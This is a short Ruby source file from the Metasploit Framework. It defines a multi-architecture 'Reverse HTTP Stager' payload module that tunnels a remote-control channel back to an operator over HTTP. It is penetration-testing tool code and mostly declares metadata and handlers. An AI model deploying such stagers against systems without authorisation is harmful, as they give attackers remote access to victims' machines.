##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/multi/reverse_http'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Multi::ReverseHttp

  # TODO: Add something to this that stops it from being usable from
  # inside msfvenom (technically this isn't a payload)
  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse HTTP Stager (multi-arch)',
      'Description' => 'Tunnel communication over HTTP (multi-architecture)',
      'Author'      => 'OJ Reeves',
      'License'     => MSF_LICENSE,
      'Platform'    => %w{ android java linux osx php python unix win },
      'Arch'        => [ARCH_X86, ARCH_X64, ARCH_PYTHON, ARCH_JAVA],
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'http'))
  end

end

